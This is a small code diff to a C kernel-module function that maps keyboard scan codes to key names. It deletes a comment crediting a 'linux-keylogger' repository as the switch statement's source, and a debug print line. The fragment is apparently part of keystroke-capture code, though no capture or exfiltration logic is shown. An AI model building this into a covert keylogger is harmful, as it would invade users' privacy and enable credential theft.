@@ -343,8 +343,6 @@ static int translate_code(unsigned char scanCode, char *buf)
         memset(buf, 0x0, BUFF_SIZE);
 
         // 2. Translate and copy in the string
-        // This switch statement was lifted from:
-        // https://github.com/b1uewizard/linux-keylogger/blob/master/kb.c
         switch(scanCode)
         {
             case 0:
@@ -506,7 +504,6 @@ static int translate_code(unsigned char scanCode, char *buf)
             case 84:
                 tempRetVal = strncpy(buf, "(SYSRQ)", BUFF_SIZE); break;
             default:
-                // printk(KERN_INFO "%s: translate_code() received unsupported scan code of %u.\n", DEVICE_NAME, scanCode);  // DEBUGGING
                 retVal = 1;
                 tempRetVal = buf;
                 break;
